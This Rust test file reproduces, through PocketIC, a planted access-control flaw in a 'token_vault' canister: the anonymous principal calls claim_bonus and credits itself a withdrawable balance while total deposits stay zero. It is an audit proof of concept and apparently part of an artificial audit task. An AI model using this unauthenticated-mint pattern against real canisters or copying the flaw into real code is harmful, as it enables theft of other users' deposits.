//! PocketIC reproduction of the token_vault planted flaw.
//!
//! Proves the boundary is crossed: the ANONYMOUS principal calls `claim_bonus`
//! and walks away with a positive, withdrawable balance while `total_deposited`
//! is still zero, breaking `sum(balances) <= total_deposited`.
//!
//! This test lives in a SEPARATE crate (token_vault_repro) beside the audited
//! token_vault crate, so the pocket-ic dev-dep never touches the target's manifest.
//! It drives the canister through its built wasm (no Rust dependency on token_vault;
//! ic-cdk canister code does not link for the host). `repro/repro.sh` builds the
//! audited crate to wasm32 first and sets `CANISTER_WASM`. It needs the PocketIC
//! server binary (`POCKET_IC_BIN`), provisioned by `scripts/stage-canister-audit.sh`
//! in the runner, so the test runs in CI / Epoch, not necessarily on a bare laptop.
//!
//! Pinned to the pocket-ic 16.x API (`update_call`/`query_call` return
//! `Result<Vec<u8>, _>`). If you bump the crate in Cargo.toml and the call
//! signatures change, update this file in the same commit.

use candid::{decode_one, encode_one, Principal};
use pocket_ic::PocketIc;

fn wasm_path() -> String {
    std::env::var("CANISTER_WASM")
        .unwrap_or_else(|_| "target/wasm32-unknown-unknown/release/token_vault.wasm".to_string())
}

fn install(pic: &PocketIc) -> Principal {
    let canister = pic.create_canister();
    pic.add_cycles(canister, 2_000_000_000_000);
    let wasm = std::fs::read(wasm_path())
        .expect("canister wasm present; run repro/repro.sh (it builds the wasm first)");
    pic.install_canister(canister, wasm, vec![], None);
    canister
}

fn query_u64(pic: &PocketIc, canister: Principal, method: &str, arg: Vec<u8>) -> u64 {
    let reply = pic
        .query_call(canister, Principal::anonymous(), method, arg)
        .expect("query call did not reject");
    decode_one(&reply).expect("reply decodes to u64")
}

#[test]
fn anonymous_principal_mints_free_balance() {
    let pic = PocketIc::new();
    let canister = install(&pic);
    let anon = Principal::anonymous();

    // Precondition: empty ledger.
    let total_before = query_u64(&pic, canister, "total_deposited", encode_one(()).unwrap());
    assert_eq!(total_before, 0, "fixture starts with an empty ledger");

    // Attack: the anonymous principal credits itself 1_000 out of thin air.
    pic.update_call(canister, anon, "claim_bonus", encode_one(1_000u64).unwrap())
        .expect("claim_bonus must be callable by the anonymous principal (that is the bug)");

    let anon_balance = query_u64(&pic, canister, "balance_of", encode_one(anon).unwrap());
    let total_after = query_u64(&pic, canister, "total_deposited", encode_one(()).unwrap());

    assert_eq!(anon_balance, 1_000, "anonymous principal minted a free balance");
    assert!(
        anon_balance > total_after,
        "INVARIANT BROKEN: attacker balance {anon_balance} exceeds total_deposited {total_after}; \
         this balance is withdrawable against other users' deposits"
    );
}
